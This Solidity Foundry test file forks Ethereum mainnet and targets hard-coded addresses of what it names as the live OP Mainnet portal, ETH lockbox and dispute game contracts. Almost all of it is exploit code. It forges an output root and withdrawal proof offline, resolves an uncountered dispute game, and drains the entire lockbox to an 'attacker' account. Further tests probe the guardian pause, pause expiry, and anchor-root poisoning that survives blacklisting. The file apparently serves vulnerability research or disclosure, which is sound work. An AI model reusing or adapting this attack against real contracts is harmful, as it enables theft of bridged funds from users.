// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

struct WdTx {
    uint256 nonce;
    address sender;
    address target;
    uint256 value;
    uint256 gasLimit;
    bytes data;
}

struct OutputRootProof {
    bytes32 version;
    bytes32 stateRoot;
    bytes32 messagePasserStorageRoot;
    bytes32 latestBlockhash;
}

interface IETHLockbox {
    function authorizedPortals(address) external view returns (bool);
    function paused() external view returns (bool);
    function version() external view returns (string memory);
}

interface IPortal {
    function proveWithdrawalTransaction(
        WdTx memory _tx,
        uint256 _disputeGameIndex,
        OutputRootProof memory _outputRootProof,
        bytes[] memory _withdrawalProof
    ) external;
    function finalizeWithdrawalTransactionExternalProof(WdTx memory, address) external;
    function l2Sender() external view returns (address);
    function ethLockbox() external view returns (address);
    function anchorStateRegistry() external view returns (address);
    function provenWithdrawals(bytes32, address) external view returns (address, uint64);
    function finalizedWithdrawals(bytes32) external view returns (bool);
    function proofMaturityDelaySeconds() external view returns (uint256);
    function paused() external view returns (bool);
    function version() external view returns (string memory);
    function guardian() external view returns (address);
    function systemConfig() external view returns (address);
}

interface IAnchorStateRegistry {
    function disputeGameFactory() external view returns (address);
    function respectedGameType() external view returns (uint32);
    function disputeGameFinalityDelaySeconds() external view returns (uint256);
    function isGameClaimValid(address) external view returns (bool);
    function isGameBlacklisted(address) external view returns (bool);
    function paused() external view returns (bool);
    function retirementTimestamp() external view returns (uint64);
    function getAnchorRoot() external view returns (bytes32, uint256);
    function setAnchorState(address _game) external;
    function blacklistDisputeGame(address _game) external;
    function anchorGame() external view returns (address);
}

interface IDisputeGameFactory {
    function create(uint32 _gameType, bytes32 _rootClaim, bytes calldata _extraData)
        external
        payable
        returns (address);
    function gameCount() external view returns (uint256);
    function gameAtIndex(uint256 _index) external view returns (uint32 gameType, uint64 timestamp, address proxy);
    function initBonds(uint32 _gameType) external view returns (uint256);
    function gameImpls(uint32 _gameType) external view returns (address);
}

interface IFaultDisputeGame {
    struct ClaimData {
        uint32 parentIndex;
        address counteredBy;
        address claimant;
        uint128 bond;
        bytes32 claim;
        uint128 position;
        uint128 clock;
    }
    function rootClaim() external view returns (bytes32);
    function status() external view returns (uint8);
    function resolveClaim(uint256 _claimIndex, uint256 _numToResolve) external;
    function resolve() external returns (uint8);
    function maxClockDuration() external view returns (uint64);
    function createdAt() external view returns (uint64);
    function l2BlockNumber() external view returns (uint256);
    function l2SequenceNumber() external view returns (uint256);
    function claimDataLen() external view returns (uint256);
    function claimData(uint256 _index) external view returns (ClaimData memory);
}

interface ISuperchainConfig {
    function pause(address _identifier) external;
    function paused(address _identifier) external view returns (bool);
    function pauseExpiry() external view returns (uint256);
}

contract TheEndOptimism is Test {
    address constant PORTAL = 0xbEb5Fc579115071764c7423A4f12eDde41f106Ed;
    address constant LOCKBOX = 0x322b47Ff1FA8D5611F761e3E275C45B71b294D43;
    address constant DEFAULT_L2_SENDER = 0x000000000000000000000000000000000000dEaD;
    address constant GUARDIAN = 0x09f7150D8c019BeF34450d6920f6B3608ceFdAf2;
    address constant SUPERCHAIN_CONFIG = 0x95703e0982140D16f8ebA6d158FccEde42f04a4C;

    IPortal portal = IPortal(PORTAL);
    IETHLockbox lockbox = IETHLockbox(LOCKBOX);

    address attacker;

    address asr;
    address dgf;
    uint32 respectedGameType;
    uint256 initBond;
    uint256 proofMaturityDelay;
    uint256 disputeGameFinalityDelay;
    uint256 lockboxBalanceBefore;

    function setUp() public {
        uint256 forkBlock = vm.envOr("FORK_BLOCK", uint256(0));
        if (forkBlock == 0) {
            vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        } else {
            vm.createSelectFork(vm.envString("ETH_RPC_URL"), forkBlock);
        }
        require(block.chainid == 1, "must fork Ethereum mainnet");

        asr = portal.anchorStateRegistry();
        dgf = IAnchorStateRegistry(asr).disputeGameFactory();
        respectedGameType = IAnchorStateRegistry(asr).respectedGameType();
        initBond = IDisputeGameFactory(dgf).initBonds(respectedGameType);
        proofMaturityDelay = portal.proofMaturityDelaySeconds();
        disputeGameFinalityDelay = IAnchorStateRegistry(asr).disputeGameFinalityDelaySeconds();
        lockboxBalanceBefore = LOCKBOX.balance;

        attacker = makeAddr("the-end-of-optimism-attacker");
        assertEq(attacker.code.length, 0, "attacker address must be a plain EOA");
        assertEq(attacker.balance, 0, "attacker address must start empty");
        vm.deal(attacker, 100 ether);
    }

    function _hashWd(WdTx memory t) internal pure returns (bytes32) {
        return keccak256(abi.encode(t.nonce, t.sender, t.target, t.value, t.gasLimit, t.data));
    }

    function _forgeMessagePasserTrie(bytes32 wdHash)
        internal
        pure
        returns (bytes32 storageRoot, bytes[] memory withdrawalProof)
    {
        bytes32 storageKey = keccak256(abi.encode(wdHash, uint256(0)));
        bytes32 pathHash = keccak256(abi.encode(storageKey));
        bytes memory leaf = abi.encodePacked(hex"e3a120", pathHash, hex"01");
        require(leaf.length == 36, "leaf encoding");
        storageRoot = keccak256(leaf);
        withdrawalProof = new bytes[](1);
        withdrawalProof[0] = leaf;
    }

    function _createAndResolveGame(bytes32 root)
        internal
        returns (address gameAddr, uint256 gameIndex)
    {
        (, uint256 anchorL2Block) = IAnchorStateRegistry(asr).getAnchorRoot();
        return _createAndResolveGameAt(root, anchorL2Block + 1);
    }

    function _createAndResolveGameAt(bytes32 root, uint256 l2Seq)
        internal
        returns (address gameAddr, uint256 gameIndex)
    {
        bytes memory extraData = abi.encode(l2Seq);

        vm.prank(attacker);
        gameAddr = IDisputeGameFactory(dgf).create{value: initBond}(respectedGameType, root, extraData);

        gameIndex = IDisputeGameFactory(dgf).gameCount() - 1;
        (uint32 gType,, address proxy) = IDisputeGameFactory(dgf).gameAtIndex(gameIndex);

        assertEq(proxy, gameAddr, "game proxy address mismatch");
        assertEq(gType, respectedGameType, "game type must be respectedGameType");
        assertEq(IFaultDisputeGame(gameAddr).rootClaim(), root, "root claim mismatch");
        assertEq(IFaultDisputeGame(gameAddr).claimDataLen(), 1, "should have exactly 1 claim (root)");
        assertEq(IFaultDisputeGame(gameAddr).status(), 0, "status should be IN_PROGRESS");

        vm.warp(block.timestamp + IFaultDisputeGame(gameAddr).maxClockDuration() + 1);

        vm.startPrank(attacker);
        IFaultDisputeGame(gameAddr).resolveClaim(0, 0);
        uint8 status = IFaultDisputeGame(gameAddr).resolve();
        vm.stopPrank();

        assertEq(status, 2, "resolve() must return DEFENDER_WINS (2)");
        assertEq(IFaultDisputeGame(gameAddr).status(), 2, "status must be DEFENDER_WINS");

        vm.warp(block.timestamp + disputeGameFinalityDelay + 1);

        bool valid = IAnchorStateRegistry(asr).isGameClaimValid(gameAddr);
        assertTrue(valid, "isGameClaimValid must be true for an uncountered DEFENDER_WINS game");
        assertFalse(IAnchorStateRegistry(asr).isGameBlacklisted(gameAddr), "game must not be blacklisted");

        console.log("  -- dispute game --");
        console.log("     address        :", gameAddr);
        console.log("     index          :", gameIndex);
        console.log("     gameType       :", gType);
        console.log("     rootClaim      :", vm.toString(root));
        console.log("     l2BlockNumber  :", IFaultDisputeGame(gameAddr).l2BlockNumber());
        console.log("     status         :", status, "(2 = DEFENDER_WINS)");
        console.log("     claimDataLen   :", IFaultDisputeGame(gameAddr).claimDataLen());
        console.log("     isGameClaimValid:", valid);
    }

    function _forgeAndProve(uint256 amount, string memory tag)
        internal
        returns (WdTx memory wd, bytes32 wdHash, address game)
    {
        wd = WdTx({
            nonce: uint256(keccak256(bytes(tag))),
            sender: attacker,
            target: attacker,
            value: amount,
            gasLimit: 100_000,
            data: ""
        });
        wdHash = _hashWd(wd);

        (bytes32 storageRoot, bytes[] memory withdrawalProof) = _forgeMessagePasserTrie(wdHash);

        OutputRootProof memory orp = OutputRootProof({
            version: bytes32(0),
            stateRoot: keccak256("no-such-l2-state-root"),
            messagePasserStorageRoot: storageRoot,
            latestBlockhash: keccak256("no-such-l2-block")
        });
        bytes32 outputRoot =
            keccak256(abi.encode(orp.version, orp.stateRoot, orp.messagePasserStorageRoot, orp.latestBlockhash));

        console.log("  -- forged proof (built offline, no L2) --");
        console.log("     withdrawalHash :", vm.toString(wdHash));
        console.log("     storageRoot    :", vm.toString(storageRoot));
        console.log("     outputRoot     :", vm.toString(outputRoot));

        uint256 gameIndex;
        (game, gameIndex) = _createAndResolveGame(outputRoot);

        vm.prank(attacker);
        portal.proveWithdrawalTransaction(wd, gameIndex, orp, withdrawalProof);

        (address provenGame, uint64 provenTs) = portal.provenWithdrawals(wdHash, attacker);
        assertEq(provenGame, game, "withdrawal must be proven against our game");
        assertTrue(provenTs != 0, "proof timestamp must be set");
        console.log("  -- proveWithdrawalTransaction accepted --");
    }

    function test_0_liveParams() public view {
        console.log("=== OP Mainnet live parameters ===");
        console.log("  portal                      :", PORTAL);
        console.log("  portal version              :", portal.version());
        console.log("  lockbox                     :", LOCKBOX);
        console.log("  lockbox version             :", lockbox.version());
        console.log("  ASR                         :", asr);
        console.log("  DGF                         :", dgf);
        console.log("  respectedGameType           :", respectedGameType);
        console.log("  gameImpls(type)             :", IDisputeGameFactory(dgf).gameImpls(respectedGameType));
        console.log("  initBond (wei)              :", initBond);
        console.log("  proofMaturityDelay (s)      :", proofMaturityDelay);
        console.log("  disputeGameFinalityDelay (s):", disputeGameFinalityDelay);
        console.log("  lockbox balance (wei)       :", lockboxBalanceBefore);
        console.log("  lockbox paused              :", lockbox.paused());
        console.log("  portal paused               :", portal.paused());
        console.log("  ASR paused                  :", IAnchorStateRegistry(asr).paused());
        console.log("  ASR retirementTimestamp     :", IAnchorStateRegistry(asr).retirementTimestamp());
        (bytes32 anchorRoot, uint256 anchorBlock) = IAnchorStateRegistry(asr).getAnchorRoot();
        console.log("  ASR anchor root             :", vm.toString(anchorRoot));
        console.log("  ASR anchor l2Block          :", anchorBlock);
        console.log("  portal.l2Sender             :", portal.l2Sender());
        console.log("  portal.ethLockbox           :", portal.ethLockbox());
        console.log("  lockbox.authorizedPortals   :", lockbox.authorizedPortals(PORTAL));
        console.log("  portal.guardian              :", portal.guardian());

        assertEq(portal.ethLockbox(), LOCKBOX, "portal must point to lockbox");
        assertEq(portal.l2Sender(), DEFAULT_L2_SENDER, "l2Sender must be default");
        assertTrue(lockbox.authorizedPortals(PORTAL), "portal must be authorized");
        assertFalse(IAnchorStateRegistry(asr).paused(), "ASR must not be paused");
        assertFalse(portal.paused(), "portal must not be paused");
        assertFalse(lockbox.paused(), "lockbox must not be paused");
    }

    function test_A_inventedRootBecomesCanonical() public {
        console.log("=== test_A: an invented root claim becomes canonical ===");
        _createAndResolveGame(keccak256("nobody-ever-computed-this-value"));
        console.log("  isGameClaimValid returned true for a value nobody ever computed");
    }

    function test_C_drainEntireLockbox() public {
        console.log("=== test_C: the entire lockbox in a single withdrawal ===");
        uint256 amount = LOCKBOX.balance;
        (WdTx memory wd, bytes32 wdHash,) = _forgeAndProve(amount, "the-end-full-drain");

        vm.warp(block.timestamp + proofMaturityDelay + 1);

        uint256 lbBefore = LOCKBOX.balance;
        uint256 attackerBefore = attacker.balance;
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        console.log("  lockbox before (wei):", lbBefore);
        console.log("  lockbox after  (wei):", LOCKBOX.balance);
        console.log("  attacker gain  (wei):", attacker.balance - attackerBefore);
        console.log("  finalized           :", portal.finalizedWithdrawals(wdHash));

        assertEq(attacker.balance - attackerBefore, amount, "attacker must receive the whole pool");
        assertEq(LOCKBOX.balance, 0, "lockbox must be empty");
        assertTrue(portal.finalizedWithdrawals(wdHash), "must be finalized");
    }

    function test_D_guardianPauseBlocks() public {
        console.log("=== test_D: guardian pause blocks the payout ===");
        (WdTx memory wd,,) = _forgeAndProve(1 ether, "the-end-paused");

        vm.warp(block.timestamp + proofMaturityDelay + 1);

        vm.prank(GUARDIAN);
        ISuperchainConfig(SUPERCHAIN_CONFIG).pause(address(0));

        assertTrue(portal.paused(), "portal should be paused");
        assertTrue(lockbox.paused(), "lockbox should be paused");

        vm.expectRevert();
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        console.log("  real guardian, real SuperchainConfig.pause() -> finalize reverts");
    }

    function test_E_pauseExpiryReopens() public {
        console.log("=== test_E: the pause expires and the payout resumes ===");
        uint256 amount = 1 ether;
        (WdTx memory wd,,) = _forgeAndProve(amount, "the-end-post-expiry");

        vm.prank(GUARDIAN);
        ISuperchainConfig(SUPERCHAIN_CONFIG).pause(address(0));
        assertTrue(portal.paused(), "portal should be paused");

        uint256 expiry = ISuperchainConfig(SUPERCHAIN_CONFIG).pauseExpiry();
        vm.warp(block.timestamp + expiry + 1);
        assertFalse(portal.paused(), "pause should have expired");

        vm.warp(block.timestamp + proofMaturityDelay + 1);

        uint256 lbBefore = LOCKBOX.balance;
        uint256 attackerBefore = attacker.balance;
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        console.log("  pause expiry (days) :", expiry / 1 days);
        console.log("  extracted      (wei):", lbBefore - LOCKBOX.balance);

        assertEq(attacker.balance - attackerBefore, amount, "attacker must receive ETH after expiry");
        assertEq(lbBefore - LOCKBOX.balance, amount, "ETH must come from the lockbox");
    }

    function test_F_poisonedAnchorSurvivesBlacklist() public {
        console.log("=== test_F: anchor poison survives Guardian blacklist ===");
        (,, address game) = _forgeAndProve(1 ether, "the-end-poison");
        bytes32 fabricated = IFaultDisputeGame(game).rootClaim();

        vm.prank(attacker);
        IAnchorStateRegistry(asr).setAnchorState(game);
        assertEq(IAnchorStateRegistry(asr).anchorGame(), game, "anchorGame must be promoted");
        (bytes32 ar1,) = IAnchorStateRegistry(asr).getAnchorRoot();
        assertEq(ar1, fabricated, "anchor now reports the fabricated root");
        console.log("  setAnchorState by EOA -> anchor root:", vm.toString(ar1));

        vm.prank(GUARDIAN);
        IAnchorStateRegistry(asr).blacklistDisputeGame(game);
        assertTrue(IAnchorStateRegistry(asr).isGameBlacklisted(game), "game must be blacklisted");
        assertFalse(IAnchorStateRegistry(asr).isGameClaimValid(game), "isGameClaimValid must be false after blacklist");

        (bytes32 ar2,) = IAnchorStateRegistry(asr).getAnchorRoot();
        assertEq(ar2, fabricated, "GAP: getAnchorRoot still returns the fabricated root after blacklist");
        console.log("  after blacklist -> anchor root STILL:", vm.toString(ar2));
        console.log("  Guardian stopped payouts but cannot unwind the poisoned anchor");
    }

    function test_G_rootPoisonAmplifiesRecovery() public {
        console.log("=== test_G: ROOT poison with absurd l2SequenceNumber ===");
        uint256 absurdSeq = uint256(99999) * 365 * 24 * 3600 / 2;
        bytes32 fabricated = keccak256("root-poison-far-future");

        (address game,) = _createAndResolveGameAt(fabricated, absurdSeq);
        assertEq(IFaultDisputeGame(game).l2SequenceNumber(), absurdSeq, "game carries the absurd seq");

        vm.prank(attacker);
        IAnchorStateRegistry(asr).setAnchorState(game);
        (bytes32 ar, uint256 ab) = IAnchorStateRegistry(asr).getAnchorRoot();
        assertEq(ar, fabricated, "anchor root poisoned");
        assertEq(ab, absurdSeq, "anchor sequence floor poisoned");
        console.log("  anchor root :", vm.toString(ar));
        console.log("  anchor l2Seq:", ab);

        vm.prank(GUARDIAN);
        IAnchorStateRegistry(asr).blacklistDisputeGame(game);
        assertFalse(IAnchorStateRegistry(asr).isGameClaimValid(game), "blacklisted -> not valid");
        (, uint256 ab2) = IAnchorStateRegistry(asr).getAnchorRoot();
        assertEq(ab2, absurdSeq, "GAP: sequence floor survives blacklist");

        (, uint256 nowAnchor) = IAnchorStateRegistry(asr).getAnchorRoot();
        vm.prank(attacker);
        vm.expectRevert();
        IDisputeGameFactory(dgf).create{value: initBond}(
            respectedGameType, keccak256("honest"), abi.encode(nowAnchor - 1)
        );
        console.log("  future games forced above:", nowAnchor);
        console.log("  recovery requires ProxyAdmin reinit naming a higher seq (Guardian cannot)");
    }

    function test_H_sequencerWinsWithinLegitimateGameRules() public {
        console.log("=== test_H: sequencer wins within legitimate game rules ===");

        // The state root a sequencer would produce via SDM refund forgery.
        // kona (challenger) derives the SAME state root because it shares the
        // Verify code path. The challenger has no different root to post.
        bytes32 sequencerStateRoot = keccak256("sdm-forged-state-root");
        address gameAddr;
        uint256 gameIndex;
        uint8 status;
        address counteredBy;
        bytes32 outputRoot;

        // --- Phase 0: compute the output root offline ---
        // The game's rootClaim is the OUTPUT ROOT, not the state root.
        // outputRoot = keccak256(version, stateRoot, messagePasserStorageRoot, latestBlockhash)
        {
            WdTx memory wd = WdTx({
                nonce: uint256(keccak256("sdm-sequencer-drain")),
                sender: attacker,
                target: attacker,
                value: LOCKBOX.balance,
                gasLimit: 100_000,
                data: ""
            });
            bytes32 wdHash = _hashWd(wd);
            (bytes32 storageRoot,) = _forgeMessagePasserTrie(wdHash);

            outputRoot = keccak256(abi.encode(
                bytes32(0),
                sequencerStateRoot,
                storageRoot,
                keccak256("sdm-forged-blockhash")
            ));
        }

        // --- Phase 1: create game with the sequencer's output root ---
        {
            (, uint256 anchorL2Block) = IAnchorStateRegistry(asr).getAnchorRoot();
            bytes memory extraData = abi.encode(anchorL2Block + 1);

            vm.prank(attacker);
            gameAddr = IDisputeGameFactory(dgf).create{value: initBond}(respectedGameType, outputRoot, extraData);
            gameIndex = IDisputeGameFactory(dgf).gameCount() - 1;

            assertEq(IFaultDisputeGame(gameAddr).rootClaim(), outputRoot, "root claim must match output root");
            assertEq(IFaultDisputeGame(gameAddr).status(), 0, "status must be IN_PROGRESS");
            assertEq(IFaultDisputeGame(gameAddr).claimDataLen(), 1, "must have 1 claim (root only)");
        }

        // --- Phase 2: warp past clock, verify uncountered, resolve ---
        {
            vm.warp(block.timestamp + IFaultDisputeGame(gameAddr).maxClockDuration() + 1);

            IFaultDisputeGame.ClaimData memory rootClaimData = IFaultDisputeGame(gameAddr).claimData(0);
            counteredBy = rootClaimData.counteredBy;
            assertEq(counteredBy, address(0), "root claim must be uncountered - challenger had no different root");

            vm.startPrank(attacker);
            IFaultDisputeGame(gameAddr).resolveClaim(0, 0);
            status = IFaultDisputeGame(gameAddr).resolve();
            vm.stopPrank();

            assertEq(status, 2, "resolve() must return DEFENDER_WINS (2)");
            assertEq(IFaultDisputeGame(gameAddr).status(), 2, "status must be DEFENDER_WINS");
        }

        // --- Phase 3: finalize game validity ---
        {
            vm.warp(block.timestamp + disputeGameFinalityDelay + 1);
            assertTrue(IAnchorStateRegistry(asr).isGameClaimValid(gameAddr), "isGameClaimValid must be true");
        }

        // --- Phase 4: prove + finalize + drain ---
        {
            WdTx memory wd = WdTx({
                nonce: uint256(keccak256("sdm-sequencer-drain")),
                sender: attacker,
                target: attacker,
                value: LOCKBOX.balance,
                gasLimit: 100_000,
                data: ""
            });
            bytes32 wdHash = _hashWd(wd);
            (bytes32 storageRoot, bytes[] memory withdrawalProof) = _forgeMessagePasserTrie(wdHash);

            OutputRootProof memory orp = OutputRootProof({
                version: bytes32(0),
                stateRoot: sequencerStateRoot,
                messagePasserStorageRoot: storageRoot,
                latestBlockhash: keccak256("sdm-forged-blockhash")
            });

            vm.prank(attacker);
            portal.proveWithdrawalTransaction(wd, gameIndex, orp, withdrawalProof);

            vm.warp(block.timestamp + proofMaturityDelay + 1);

            uint256 attackerBefore = attacker.balance;
            uint256 lbBefore = LOCKBOX.balance;
            portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

            console.log("  counteredBy       :", counteredBy, "(0 = uncountered)");
            console.log("  gameStatus        :", status, "(2 = DEFENDER_WINS)");
            console.log("  lockbox before    :", lbBefore);
            console.log("  lockbox after     :", LOCKBOX.balance);
            console.log("  attacker gain     :", attacker.balance - attackerBefore);

            assertEq(attacker.balance - attackerBefore, lbBefore, "attacker must receive the whole pool");
            assertEq(LOCKBOX.balance, 0, "lockbox must be empty");
            assertTrue(portal.finalizedWithdrawals(wdHash), "must be finalized");
        }
    }
}
